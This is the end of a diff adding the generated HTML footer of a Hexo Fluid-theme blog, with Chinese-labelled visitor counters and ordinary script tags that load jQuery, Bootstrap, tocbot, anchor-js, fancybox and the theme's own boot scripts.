+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
